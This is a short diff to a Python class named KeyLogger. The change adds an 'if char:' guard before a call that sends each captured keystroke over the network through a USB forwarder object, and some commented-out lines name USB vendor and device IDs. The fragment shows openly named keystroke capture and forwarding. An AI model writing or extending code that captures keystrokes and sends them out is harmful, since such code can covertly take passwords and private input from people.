@@ -88,7 +88,8 @@ class KeyLogger:
                 else:
                     char = "Not FOUND"
                 print(f"Key pressed: {key_code} ({char})")
-                self.__USBForwarder.send_over_network(char)
+                if char:
+                    self.__USBForwarder.send_over_network(char)
                 # try:
                 #     id_vendor = 0x247d
                 #     device_id = 0xc53a
